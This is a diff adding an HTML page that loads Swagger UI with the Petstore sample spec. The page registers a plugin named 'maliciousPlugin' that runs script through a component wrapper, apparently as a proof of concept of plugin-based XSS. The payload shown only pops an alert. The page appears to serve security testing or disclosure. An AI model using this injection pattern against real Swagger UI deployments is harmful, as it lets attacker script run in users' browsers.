@@ -1,0 +1,29 @@
+<html>
+<head>
+  <script>
+    window.maliciousPlugin = function() {
+      return {
+        wrapComponents: {
+          info: () => () => {
+            alert('🔥 Plugin XSS Works!');
+            return null;
+          }
+        }
+      }
+    }
+  </script>
+  <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-bundle.js"></script>
+  <script>
+    window.onload = function() {
+      SwaggerUIBundle({
+        url: "https://petstore.swagger.io/v2/swagger.json",
+        dom_id: "#swagger-ui",
+        plugins: [window.maliciousPlugin]
+      });
+    };
+  </script>
+</head>
+<body>
+  <div id="swagger-ui"></div>
+</body>
+</html>
